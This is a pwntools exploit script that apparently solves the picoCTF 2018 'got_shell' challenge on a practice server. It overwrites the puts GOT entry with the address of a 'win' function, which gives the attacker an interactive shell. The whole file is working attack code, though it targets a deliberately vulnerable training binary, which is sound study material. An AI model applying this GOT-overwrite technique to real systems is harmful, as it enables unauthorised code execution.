# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = './picoctf_2018_got_shell'
islocal = 0
libc = ELF('/lib/27_12.ld.so.2')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25893)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def pwn():
    puts_got = elf.got['puts']
    shell_addr = elf.sym['win']
    log.success('puts_got => ' + hex(puts_got))
    log.success('shell_addr => ' + hex(shell_addr))
    p.sendlineafter('value?\n', hex(puts_got))
    p.recv()
    p.sendline(hex(shell_addr))
    p.interactive()

if __name__ == '__main__':
    pwn()